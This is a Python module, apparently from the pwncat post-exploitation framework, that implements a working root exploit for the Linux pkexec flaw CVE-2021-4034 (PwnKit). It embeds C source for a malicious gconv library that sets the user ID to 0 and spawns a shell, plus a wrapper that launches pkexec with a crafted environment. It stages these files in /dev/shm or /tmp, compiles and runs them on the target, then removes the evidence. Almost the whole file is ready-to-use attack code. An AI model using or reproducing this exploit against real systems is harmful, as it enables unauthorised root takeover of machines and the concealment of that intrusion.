#!/usr/bin/env python3

import rich.markup
import textwrap
import subprocess
from subprocess import CalledProcessError
from io import StringIO

from pwncat import util
from pwncat.db import Fact
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pwncat.platform import PlatformError, Path

def errcheck(result, func, args):
    if not result:
        print("NORESULT")
    else:
        print(result)

class Module(BaseModule):
    """ Exploit CVE-2021-4034 to privesc to root """

    """
    Based on original PoC at https://github.com/arthepsy/CVE-2021-4034
    
    Usage: run pwnkit 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    def run(self, session: "pwncat.manager.Session"):

        yield Status( "preparing to privesc to [red]root[/red]")

        # Write the pwnkit source code
        pwnkit_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <stdlib.h>
                #include <unistd.h>
                void gconv() {{}}
                void gconv_init() {{
                       setuid(0); setgid(0);
                       seteuid(0); setegid(0);
                       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; {session.platform.shell}\");
                       exit(0);
                }}
            """
        ).lstrip()

        pwnkitshell_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <stdlib.h>
                #include <unistd.h>
                int main(int argc, char *argv[]) {{
                    char *env[] = {{ "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL }};
                    execve("/usr/bin/pkexec", (char*[]){{NULL}}, env);
                }}
            """
        ).lstrip()

        seed_dir = util.random_string(8)

        # Find a temp dir we can use
        tempdir = session.platform.Path("/dev/shm")
        if not tempdir.is_dir():
            tempdir = session.platform.Path("/tmp")
        if not tempdir.is_dir():
            raise FileNotFoundError("No temp dirs to leverage. Aborting!")

        scratch_path = session.platform.Path( tempdir / seed_dir)

        scratch_path.mkdir()
        (scratch_path / 'GCONV_PATH=.').mkdir()
        (scratch_path / 'GCONV_PATH=./pwnkit').touch()
        (scratch_path / 'GCONV_PATH=./pwnkit').chmod(0o755) 
        (scratch_path / "pwnkit").mkdir()
        (scratch_path / "pwnkit" / "gconv-modules").write_text( "module UTF-8// PWNKIT// pwnkit 2" )

        session.platform.chdir(scratch_path)

        pkexec = session.platform.which("pkexec")
        if pkexec is None:
            raise PlatformError("no pkexec found on target")
        
        current_user = session.current_user()
        orig_id = current_user.id

        # Compile pwnkit binary
        try:
            pwnkit = session.platform.compile(
                [StringIO(pwnkit_source)],
                cflags=["-shared", "-fPIC"],
                output=str((scratch_path / "pwnkit" / "pwnkit.so"))
            )
        except PlatformError as exc:
            raise ModuleFailed( f"compilation failed for pwnkit: {exc}") from exc

        # Compile the pwnkit wrapper exploit binary
        try:
            exploit = session.platform.compile(
                [StringIO(pwnkitshell_source)],
                output=str((scratch_path / "exploit"))
            )
        except PlatformError as exc:
            raise ModuleFailed( f"compilation failed for pwnkit wrapper: {exc}") from exc        

        try:
            exploit_path = str(scratch_path / "exploit")

            yield Status( "attempting to privesc to [red]root[/red]")               
            proc = session.platform.Popen( 
                [exploit_path], 
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            proc.detach()

            if session.platform.refresh_uid() != 0:
                session.log( "refresh_uid didn't work" )
                yield Status( "Failed to privesc to [red]root[/red]")     

        except CalledProcessError as exc:
            session.log( "Failed privesc" )
            self.__cleanup(session, scratch_path)            
            raise ModuleFailed(f"privesc failed: {exc}") from exc
        
        current_user = session.current_user()
        curr_id = current_user.id

        uid_status = f"UID : Before([blue]{orig_id}[/blue]) | After({curr_id})"
        yield Status( f"{uid_status}") 
        self.__cleanup(session, scratch_path)
            
        session.log( f"ran {self.name}. {uid_status}")

    def __cleanup( self, session: "pwncat.manager.Session", scratch_path: "session.platform.Path" ):
        # Get out of scratch_pad if we are there
        session.platform.chdir("/")

        if (scratch_path / "pwnkit" / "gconv-modules").exists():
            (scratch_path / "pwnkit" / "gconv-modules").unlink()
        
        if (scratch_path / "pwnkit" / "pwnkit.c").exists():
            (scratch_path / "pwnkit" / "pwnkit.c").unlink()
        
        if (scratch_path / "pwnkit" / "pwnkit.so").exists():
            (scratch_path / "pwnkit" / "pwnkit.so").unlink()

        if (scratch_path / "exploit.c").exists():
            (scratch_path / "exploit.c").unlink()

        if (scratch_path / "exploit").exists():
            (scratch_path / "exploit").unlink()            
        
        if (scratch_path / "pwnkit").exists():
            (scratch_path / "pwnkit").rmdir()    

        if (scratch_path / 'GCONV_PATH=./pwnkit').exists():    
            (scratch_path / 'GCONV_PATH=./pwnkit').unlink()        

        if (scratch_path / 'GCONV_PATH=.').exists(): 
            (scratch_path / 'GCONV_PATH=.').rmdir()

        if (scratch_path).exists():
            (scratch_path).rmdir()

        # Need to fetch outside of cached file stat
        if session.platform.Path(str(scratch_path)).exists():
            # WTF? Everything should have been removed cleanly
            session.log( f"Failed to remove everything in {scratch_path} during cleanup" )

   
